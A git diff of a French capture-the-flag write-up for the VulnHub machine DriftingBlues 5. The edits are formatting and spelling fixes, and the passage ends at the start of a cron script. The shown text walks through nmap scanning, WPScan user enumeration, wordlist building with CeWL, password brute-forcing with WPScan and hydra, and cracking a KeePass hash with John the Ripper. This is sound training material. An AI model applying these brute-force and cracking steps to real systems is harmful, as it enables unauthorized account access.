@@ -8,7 +8,7 @@ Le 5ème élément
 
 Challenge téléchargeable sur VulnHub [à cette adresse](https://www.vulnhub.com/entry/driftingblues-5,662/). Nmap nous indique tout de suite la présence d'un Wordpress.  
 
-```
+```console
 $ sudo nmap -sCV -T5 -p- 192.168.56.10 
 [sudo] Mot de passe de root :  
 Starting Nmap 7.92 ( https://nmap.org )
@@ -29,7 +29,7 @@ PORT   STATE SERVICE VERSION
 
 C'est toujours mieux d'avoir un outil pour énumérer les utilisateurs au lieu de le faire à la main :  
 
-```
+```console
 $ docker run -it --rm wpscanteam/wpscan --url http://192.168.56.10/ -e ap,at,u
 --- snip ---
 
@@ -61,20 +61,20 @@ $ docker run -it --rm wpscanteam/wpscan --url http://192.168.56.10/ -e ap,at,u
 
 Comme cette série de CTFs se prête volontiers aux jeux de pistes j'ai directement extrait les mots des pages web en utilisant CeWL. Exemple :  
 
-```
+```console
 $ docker run -it --rm cewl http://192.168.56.10/index.php/2021/02/24/a-deep-dive-on-the-blancpain-fifty-fathoms/ >> words.txt
 ```
 
-Bien sûr on prendra soin de trier et de retirer les doublons (voir pages de manuel de sort et uniq) avant de bruteforcer.  
+Bien sûr, on prendra soin de trier et de retirer les doublons (voir pages de manuel de sort et uniq) avant de bruteforcer.  
 
-```
+```console
 $ docker run -v /tmp/:/data -it --rm wpscanteam/wpscan --url http://192.168.56.10/ -U abuzerkomurcu,gill,collins,satanic,gadd -P /data/words.txt
 --- snip ---
 [!] Valid Combinations Found: 
  | Username: gill, Password: interchangeable
 ```
 
-Hmmm cet utilisateur n'est pas l'admin. Il peut uploader des médias mais le type de fichier est vérifié...  
+Hmmm cet utilisateur n'est pas l'admin. Il peut uploader des médias, mais le type de fichier est vérifié...  
 
 Sur le Wordpress je remarque une page de brouillon baptisée *Privacy Policy — Draft, Privacy Policy Page* malheureusement je ne peux pas y accéder.  
 
@@ -88,7 +88,7 @@ Je n'avais pas envie de me casser la tête dessus alors j'ai réutilisé un code
 
 Une fois la wordlist avec les permutations générées on se rend compte que ça ne servait à rien :  
 
-```
+```console
 $ hydra -L users.txt -P cases.txt ssh://192.168.56.10 
 Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway). 
 
@@ -107,7 +107,7 @@ Password exchange
 
 Dans le dossier de l'utilisateur se trouve une archive pour le gestionnaire de mots de passe Keypass. On utilise un utilitaire de *John The Ripper* pour en obtenir un hash :  
 
-```
+```console
 $ keepass2john keyfile.kdbx  
 keyfile:$keepass$*2*60000*0*86fe1a63955b5984c0adb127a869153f24c41fdc56678d555f778d1309f9867c*e580d1bef4bf0f44b845fce13c9648cd22f143760be5bae503a419a7f76a21f0*e99d45aab90c26200191dbca6b3fae34*e3169392c5eec5e094b
 1f22a01084f894598280874de2bf8291ea2185051f7e3*78d0b1eb59343754ce0ce33b2efb5e25c595317099a65ed208bfc2f6ab8c8dcd
@@ -115,7 +115,7 @@ keyfile:$keepass$*2*60000*0*86fe1a63955b5984c0adb127a869153f24c41fdc56678d555f77
 
 C'est cassé relativement rapidement sans GPU :  
 
-```
+```console
 $ john --wordlist=rockyou.txt  hash.txt 
 Using default input encoding: UTF-8 
 Loaded 1 password hash (KeePass [SHA256 AES 32/64]) 
@@ -174,7 +174,7 @@ Ces identifiants permettent bien sûr l'accès root et l'obtention du flag final
 Sous le capot
 -------------
 
-Voici le script lié à la tache CRON :  
+Voici le script lié à la tâche CRON :  
 
 ```bash
 #!/bin/bash 
